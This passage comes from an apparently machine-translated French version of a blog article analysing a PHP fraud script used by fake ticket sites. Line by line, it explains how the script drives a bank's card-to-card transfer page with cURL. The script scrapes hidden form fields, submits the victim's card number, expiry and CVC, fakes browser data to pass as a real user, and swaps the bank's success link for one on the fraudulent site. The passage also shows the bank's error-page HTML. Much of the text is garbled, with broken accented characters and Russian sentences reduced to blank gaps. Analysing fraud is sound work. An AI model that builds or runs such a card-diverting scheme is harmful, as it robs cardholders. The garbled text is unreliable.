Ligne 80-91 Pour effectuer une traduction, vous devez d'abord vous rendre sur la page de service. </font></font><br>
<br>
<code>https://3ds.payment.ru/cgi-bin/get_trans_cond_p2p</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font></font><br>
<img src="https://habrastorage.org/files/e04/5eb/8e4/e045eb8e4a4d42c6be37ff2946da439c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette page affiche quelque chose comme cette ligne:</font></font><br>
<br>
<pre><code class="hljs json">{<span class="hljs-attr"><span class="hljs-attr">"ORDER_NUM"</span></span>:<span class="hljs-string"><span class="hljs-string">"20161027070425023400"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"TIMESTAMP"</span></span>:<span class="hljs-string"><span class="hljs-string">"20161027070425"</span></span>}</code></pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
"ORDER_NUM" est ~ "NumÃ©ro de commande", "TIMESTAMP" est l'horodatage actuel. Si la page est actualisÃ©e, de nouvelles donnÃ©es sont toujours Ã©mises. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pour lire une page Web ou envoyer des donnÃ©es vers une page Web, utilisez la commande curl. Curl (cURL) vous permet de vous connecter par programme Ã  des serveurs Web Ã  l'aide de divers protocoles, y compris http et https. Dans notre cas, curl est un navigateur Web logiciel qui peut enregistrer des pages Web dans des variables. La page stockÃ©e dans la variable est une trÃ¨s longue ligne avec le code source HTML de cette page. Vous pouvez travailler avec de telles variables de chaÃ®ne de la mÃªme maniÃ¨re qu'avec n'importe quelle chaÃ®ne - vous pouvez rechercher du texte, remplacer du texte, etc. Curl dans les scripts dÃ©crits sera utilisÃ© plusieurs fois.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 80 - L'URL est stockÃ©e dans la variable $ login_url. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 81 - L'URL est stockÃ©e dans la variable $ agent. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 82 - Initialise la session cURL. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 83-90 - Les paramÃ¨tres sont dÃ©finis pour la session avec CURL (adresse de page stockÃ©e prÃ©cÃ©demment dans $ login_url; identifiant de navigateur prÃ©cÃ©demment stockÃ© dans $ agent; page Ã  partir de laquelle la page est redirigÃ©e ou autrement rÃ©fÃ©rencÃ©e; REFERER; paramÃ¨tres COOKIE, etc.) </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 91 - Ã€ la suite de la commande curl_exec, une page Web sera obtenue par programme, qui sera enregistrÃ©e dans la variable $ page. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 93-95 La page Web enregistrÃ©e $ page contient ~ "numÃ©ro de commande" ORDER_NUM, qui est stockÃ© dans la variable $ ord.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 96-98 La page Web $ page enregistrÃ©e contient l'horodatage TIMESTAMP, qui est stockÃ© dans la variable $ tim.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemple d'informations de dÃ©bogage</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/416/148/8ba/4161488ba0f64c8d9575a7f973d3d841.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/6f6/35b/d05/6f635bd056d5466a956643acab2e3b30.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, un "navigateur logiciel" doit aller sur la page </font></font><code>https://3ds.payment.ru/P2P_ACTION/card_form.html</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. Il s'agit de la mÃªme page de paiement, dont une capture d'Ã©cran a Ã©tÃ© montrÃ©e ci-dessus. Il s'agit d'une page avec un formulaire dont une partie des champs de service est masquÃ©e. Une partie du code HTML avec des champs de saisie masquÃ©s a Ã©tÃ© montrÃ©e ci-dessus. Certaines valeurs de ces champs masquÃ©s doivent Ãªtre mÃ©morisÃ©es afin de pouvoir les utiliser ultÃ©rieurement lors de la soumission du formulaire. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 99 - Nous enregistrons l'adresse de la page dans la variable $ url. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 100 - Les paramÃ¨tres de la session avec URL sont dÃ©finis (dans ce cas, seule l'adresse de page. Les autres paramÃ¨tres restent les mÃªmes). </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 101-102 Les variables $ page et $ part prÃ©cÃ©demment utilisÃ©es sont supprimÃ©es. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 103 - Ã€ la suite de la commande curl_exec, une page Web sera obtenue par programme, qui sera enregistrÃ©e dans la variable $ page.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 104-106 La page Web $ page enregistrÃ©e contient la valeur du champ TERMINAL, qui est stockÃ©e dans la variable $ term. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 107-109 La page Web $ page enregistrÃ©e contient la valeur du champ TRTYPE, qui est stockÃ©e dans la variable $ type. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 110-112 La page Web $ page enregistrÃ©e contient la valeur du champ MERCHANT, qui est stockÃ©e dans la variable $ merch. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 113-115 La page Web $ page enregistrÃ©e contient la valeur du champ EMAIL, qui est stockÃ© dans la variable $ ml. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En gÃ©nÃ©ral, ces valeurs sous la forme indiquÃ©e ne changent jamais. Et ils pourraient Ãªtre enregistrÃ©s dans le code sous forme de constantes et ne pas Ãªtre reÃ§us Ã  chaque fois. De toute Ã©vidence, l'obtention des valeurs de ces champs est effectuÃ©e pour plus de sÃ©curitÃ© au cas oÃ¹ un ou plusieurs champs changeraient dans le futur.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Description de certains champs. </font><font style="vertical-align: inherit;">Une description complÃ¨te de tous les champs est facile Ã  trouver dans Google.</font></font><br>
<br>
<blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TERMINAL - NumÃ©ro unique du terminal virtuel du point de vente </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
MERCH_NAME - Nom du point de </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
vente MERCHANT - NumÃ©ro du point de vente attribuÃ© par la banque </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
TRTYPE - Type de transaction demandÃ©e (Paiement - 1, Annuler - 22, PrÃ©-autorisation - 0, Finalisation des rÃ¨glements - 21) </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
EMAIL - Adresse e-mail envoyer des alertes</font></font></blockquote><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemple d'informations de dÃ©bogage</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/bf5/4a7/457/bf54a74574f44b1a8cb34bfa95eac091.png"><br>
    ,   -   . ($page)<br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
EMAIL ici, c'est un cas Ã©pique. Peu importe, des documents supplÃ©mentaires sur cet EMAIL Ã  la fin de l'article dans l'application sous le spoiler. </font></font><br>
<br>
<img src="https://habrastorage.org/files/9d4/cf1/5c9/9d4cf15c98584bc8a4dc45b78051ad26.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ici, nous voyons un grand bloc. Le fait qu'il paraisse volumineux s'explique par la largeur de colonne limitÃ©e dans la publication et la prÃ©sentation pratique du code par l'auteur du script. Tout de mÃªme pourrait Ãªtre placÃ© dans 10 lignes de code, mais la commoditÃ© de lire et de modifier le code en souffrirait. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 120 - Dans la variable $ url, enregistrez l'adresse de la page. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 121-123 - DÃ©finissez les paramÃ¨tres d'une session avec URL. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 124 - un tableau de $ ncrd est crÃ©Ã© Ã  partir du numÃ©ro de carte du destinataire dans la variable de chaÃ®ne $ crd, qui contiendra des parties du numÃ©ro de carte divisÃ©es en quatre. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 125 - Les en-tÃªtes HTTP sont stockÃ©s dans la variable de tableau $ headers.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 126 - Les paramÃ¨tres sont dÃ©finis pour la session avec CURL (en-tÃªtes HTTP de la variable $ headers. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 135-164 - Un tableau $ postL est crÃ©Ã©, dont chaque valeur correspondra au champ de formulaire sur la page de paiement (numÃ©ro de carte de l'expÃ©diteur, divisÃ© par quatre; date d'expiration de la carte de l'expÃ©diteur ; Carte CVC de l'expÃ©diteur; numÃ©ro de carte du destinataire Ã  quatre voies; date d'expiration de la carte du destinataire; carte CVC du destinataire; montant du paiement; "numÃ©ro de commande"; description de la page de confirmation; numÃ©ro du terminal; nom du point de vente; e-mail pour les notifications; horodatage ; numÃ©ro de carte de l'expÃ©diteur non divisÃ© en parties; numÃ©ro de carte du destinataire non divisÃ© en parties; donnÃ©es sur le logiciel et le matÃ©riel "sur l'ordinateur de l'expÃ©diteur", conÃ§ues pour crÃ©er l'apparence d'un utilisateur rÃ©el, pas d'un script).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 135 - Les paramÃ¨tres sont dÃ©finis pour la session cURL (donnÃ©es transmises dans la requÃªte HTTP POST. Dans ce cas, le tableau $ postL est converti en une chaÃ®ne, qui est une chaÃ®ne codÃ©e par URL, comme </font></font><code>'p1=val1&amp;p2=val2&amp;...'</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Des donnÃ©es plus clairement transmises sont affichÃ©es dans la capture d'Ã©cran avec les informations de dÃ©bogage ci-dessous.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemple d'informations de dÃ©bogage</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/9b0/140/642/9b0140642ef74fbf968fa4c299677a33.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/f9e/70e/ac8/f9e70eac88e74b088d3c37c1736eab09.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 166 - Ã€ la suite de la commande curl_exec, les donnÃ©es prÃ©parÃ©es seront envoyÃ©es au formulaire de page Web en utilisant la mÃ©thode POST. Pour une page Web, une telle soumission aura exactement la mÃªme apparence que si un utilisateur rÃ©gulier remplissait et confirmait le formulaire dans un navigateur normal. La page avec le rÃ©sultat de l'envoi de donnÃ©es au formulaire sera enregistrÃ©e dans la variable $ page. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 167 - La session cURL se termine. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 168 - Dans la page rÃ©sultante, qui est stockÃ©e dans la variable $ page, et comme nous nous en souvenons, est une longue ligne, la sous-chaÃ®ne Â«ErreurÂ» est recherchÃ©e.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 169-173 - Si la sous-chaÃ®ne Â«ErreurÂ» est trouvÃ©e, le message d'erreur Â«La carte ne correspond pasÂ» s'affiche pendant 5 secondes, puis le script se ferme et redirige la page affichÃ©e dans le navigateur vers la Â«page de commandeÂ». Si l'utilisateur persiste, il peut Ã  nouveau essayer de passer par la procÃ©dure de paiement. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Page affichÃ©e en cas d'erreur. </font></font><br>
<br>
<img src="https://habrastorage.org/files/2f6/7b0/d80/2f67b0d80a7e49b88b9432eacd6d9085.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Les causes d'erreurs que la banque Ã©met peuvent Ãªtre diffÃ©rentes (une erreur dans le numÃ©ro de carte, des fonds insuffisants, une erreur d'autorisation, et bien d'autres). Mais pour le script payp2p.php il n'y a pas de diffÃ©rence. Une fois le paiement Ã©chouÃ©, cela signifie que l'utilisateur est redirigÃ© vers la page Ã  partir de laquelle vous pouvez rÃ©pÃ©ter la tentative de paiement. La page Ã  laquelle l'erreur est renvoyÃ©e peut Ãªtre facilement modifiÃ©e en fonction de la tÃ¢che.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemple de code HTML retournÃ© par la page bancaire, en cas d'erreur</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span><font></font>
<font></font>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">base</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/netcetera/netcetera.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/riskminder-client.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
    </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">redirect</span></span></span></span><span class="javascript"><span class="hljs-function">(</span></span><span class="hljs-params"><span class="javascript"><span class="hljs-function"><span class="hljs-params">rctext, ext_diag_code</span></span></span></span><span class="javascript"><span class="hljs-function">)</span></span></span><span class="javascript">{
	</span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Call your bank"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/CallYourBank"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Your card is restricted"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/ForbiddenTransaction"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Your card is disabled"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/BlockedCard"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Invalid amount"</span></span></span><span class="javascript"> || rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in amount field"</span></span></span><span class="javascript"> || rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Wrong original amount"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectAmount"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Re-enter transaction"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/Retry"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Expired card"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/ExpiredCard"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Not sufficient funds"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/InsufficientBalance"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Exceeds amount limit"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/AmountOverlimit"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Exceeds frequency limit"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/QuantityOverlimit"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in card number field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectNumber"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in card expiration date field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectExpiresDate"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in currency field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectCurrency"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Authentication failed"</span></span></span><span class="javascript"> &amp;&amp; ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"AS_FAIL"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectPassword"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Authentication failed"</span></span></span><span class="javascript"> &amp;&amp; (ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"NS_ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"S_ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"UNAVAIL"</span></span></span><span class="javascript">)){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/3DSFailure"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> {
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/TechReasons"</span></span></span><span class="javascript">;
	}
   }
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onload</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"netcetera_set_DID('');redirect('Authentication failed','BIN_ERROR')"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Un exemple d'informations de dÃ©bogage si la banque signale une erreur lors du paiement</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/73f/c74/88a/73fc7488aa40469da8984c474be4ae1b.png"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 174 - S'il n'y avait pas de sortie prÃ©cÃ©dente du script en raison d'une erreur lors du paiement, cela signifie que tout se passe comme prÃ©vu. </font><font style="vertical-align: inherit;">Dans la page prÃ©cÃ©demment enregistrÃ©e dans la variable $ page, toutes les sous-chaÃ®nes avec l'adresse sont remplacÃ©es par une </font></font><code>https://3ds.payment.ru/cgi-bin/cgi_link</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chaÃ®ne avec une adresse de type mydomain.ru/sus.php?cd = ... - c'est l'adresse de la page du site frauduleux Ã  laquelle l'utilisateur doit accÃ©der si le paiement est rÃ©ussi. </font><font style="vertical-align: inherit;">(Sur une telle page, l'utilisateur peut Ãªtre remerciÃ© et informÃ© que des billets Ã©lectroniques ont Ã©tÃ© envoyÃ©s par courrier). </font><font style="vertical-align: inherit;">AprÃ¨s avoir remplacÃ© la sous-chaÃ®ne, le rÃ©sultat est stockÃ© dans la variable $ pp.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 175 - La variable $ pp s'affiche dans le navigateur. Puisque la variable $ pp est une chaÃ®ne avec le code HTML complet de la page, l'utilisateur verra une page. La page affichÃ©e ne diffÃ©rera pas extÃ©rieurement de la page d'origine que la banque a donnÃ©e - la diffÃ©rence sera uniquement Ã  l'intÃ©rieur du code HTML Ã  l'endroit oÃ¹ le lien a Ã©tÃ© remplacÃ©. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Alors, quelle est cette page que la banque donne en cas de saisie du bon numÃ©ro de carte, et dans laquelle le script substitue un lien vers la page de paiement rÃ©ussie sur un site frauduleux? Et aprÃ¨s tout, probablement, il devrait toujours y avoir un chÃ¨que 3D Secure des banques Ã©mettrices, qui ne permettra pas le paiement? Le code s'est terminÃ© Ã  l'endroit le plus intÃ©ressant et il y a des doutes que sans scripts, formulaires, etc. compliquÃ©s, il peut fonctionner.</font></font><br>
<br>
<b>     .          - .     .       .</b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Je conduis mon numÃ©ro de carte bancaire dans le fichier aviacfg.php. J'essaierai d'accepter le transfert, si cela fonctionne bien sÃ»r. J'ouvre la page du formulaire prÃ©cÃ©demment enregistrÃ©e sur le disque. Ce formulaire a simplement Ã©tÃ© enregistrÃ© dans le navigateur lors de la visite de l'un des sites frauduleux qui, au moment de la rÃ©daction de la premiÃ¨re partie de la publication, fonctionnait toujours. Le formulaire a dÃ©jÃ  Ã©tÃ© enregistrÃ© avec la somme de 2915 roubles, mais pour le tester, c'est trop. Changeons-le. Dans n'importe quelle forme, il y a des champs visibles et cachÃ©s. Les champs masquÃ©s (entrÃ©e, sÃ©lection) ne sont pas diffÃ©rents des champs ordinaires, sauf qu'ils ne sont pas visibles. Ces champs sont utilisÃ©s pour stocker des informations de service que l'utilisateur n'a pas besoin de voir. Les champs de saisie sont masquÃ©s de deux maniÃ¨res.</font></font><br>
<br>
<ul>
<li>  CSS ( display:none).    ,     (input),    , ( DIV)     input.</li>
